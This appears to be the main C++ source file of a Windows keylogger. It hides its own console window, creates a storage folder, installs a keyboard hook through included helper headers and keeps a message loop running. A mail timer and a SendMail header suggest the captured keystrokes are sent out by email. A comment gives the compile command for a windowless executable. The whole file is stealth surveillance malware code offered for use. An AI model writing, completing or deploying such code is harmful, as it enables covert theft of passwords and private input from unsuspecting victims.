#include <iostream>
#include <Windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "Keybhook.h"

using namespace std;
void hide();

int main()
{
	hide(); // set console window to appear for a instant
	MSG Msg; // msg object to be processed, but actually never is processed

	IO::MKDir(IO::GetOurPath(true));

	InstallHook();

	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	{
		TranslateMessage(&Msg); //Translates virtual-key messages into character messages.
		DispatchMessage(&Msg); //dispatches a message to a window procedure in a program
	}

	MailTimer.Stop();
	return 0;
}

void hide()
{
	HWND stealth; // window handler used to hide the outputted console window
	AllocConsole(); // Allocates a console window
	stealth = FindWindowA("ConsoleWindowClass", NULL); //Retrieves the handle to the window using FindWindowA
	if (stealth) {
        ShowWindow(stealth, SW_HIDE);  // Hides the console window
    } else {
        std::cout << "Failed to find the console window!" << std::endl;
    }
}
//g++ -o myprogram.exe myprogram.cpp -mwindows
